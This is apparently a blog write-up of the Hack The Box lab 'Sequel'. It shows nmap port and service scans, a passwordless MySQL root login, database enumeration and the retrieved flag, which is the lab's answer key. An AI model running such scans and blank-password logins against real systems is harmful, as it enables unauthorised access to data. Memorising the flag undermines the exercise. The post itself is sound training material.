---
layout: single
title: 'Sequel'
excerpt: 'Sequel is a very easy Linux machine that introduces a vulnerable MySQL service misconfigured to allow access without a password. The machine showcases how to enumerate and interact with the database through SQL queries to extract critical information.'
date: 2026-06-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-sequel/sequel_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-1-Fundamental-Exploitation
os: Linux
difficulty: Very Easy
release: 2021-10-06
ip: 10.129.135.243
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-sequel/Task 1.png)

<pre class="language-"><code class="language-">
  ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.135.243 -oG allPorts
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-28 00:23 -05
Initiating Ping Scan at 00:23
Scanning 10.129.135.243 [4 ports]
Completed Ping Scan at 00:23, 0.33s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:23
Scanning 10.129.135.243 [65535 ports]
Discovered open port 3306/tcp on 10.129.135.243
Completed SYN Stealth Scan at 00:24, 14.05s elapsed (65535 total ports)
Nmap scan report for 10.129.135.243
Host is up, received reset ttl 63 (0.10s latency).
Scanned at 2026-06-28 00:23:54 -05 for 14s
Not shown: 65328 closed tcp ports (reset), 206 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
           Raw packets sent: 69218 (3.046MB) | Rcvd: 67062 (2.682MB)
</code></pre>

## Task 2

![Task 2](/assets/images/htb-writeup-sequel/Task 2.png)

<pre class="language-"><code class="language-">
 ❯ nmap -sCV -p3306 -oN targeted 10.129.135.243
 Nmap scan report for 10.129.135.243
Host is up (0.096s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 74
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Speaks41ProtocolNew, Speaks41ProtocolOld, LongColumnFlag, ConnectWithDatabase, SupportsCompression, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, Support41Auth, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: tE:45OjIoqj@@_?]516\
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sun Jun 28 00:39:57 2026 -- 1 IP address (1 host up) scanned in 205.60 seconds

</code></pre>

## Task 3

![Task 3](/assets/images/htb-writeup-sequel/Task 3.png)

## Task 4

![Task 4](/assets/images/htb-writeup-sequel/Task 4.png)

<pre class="language-"><code class="language-">
❯ mysql -u root -h 10.129.135.243  -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 83
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
</code></pre>

## Task 5

![Task 5](/assets/images/htb-writeup-sequel/Task 5.png)

## Task 6

![Task 6](/assets/images/htb-writeup-sequel/Task 6.png)

## Task 7

![Task 7](/assets/images/htb-writeup-sequel/Task 7.png)

<pre class="language-"><code class="language-">
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,28 sec)

mysql> 
</code></pre>

## Task 8

![Task 8](/assets/images/htb-writeup-sequel/Task 8.png)

## Task 9

![Task 9](/assets/images/htb-writeup-sequel/Task 9.png)

## Task 10

![Task 10](/assets/images/htb-writeup-sequel/Task 10.png)

<pre class="language-"><code class="language-">
mysql> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0,16 sec)

mysql> describe config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0,18 sec)

mysql> describe users;
+----------+---------------------+------+-----+---------+----------------+
| Field    | Type                | Null | Key | Default | Extra          |
+----------+---------------------+------+-----+---------+----------------+
| id       | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| username | text                | YES  |     | NULL    |                |
| email    | text                | YES  |     | NULL    |                |
+----------+---------------------+------+-----+---------+----------------+
3 rows in set (0,22 sec)

mysql> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <span style="color: #bb66ff;">7b4bec00d1a39e3dd4e021ec3d915da8</span> |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0,22 sec)

mysql> 
</code></pre>

## Submit Flag

![Task 11](/assets/images/htb-writeup-sequel/Task 11.png)

![You have solved Sequel!](/assets/images/htb-writeup-sequel/You%20have%20solved%20Sequel!.png)
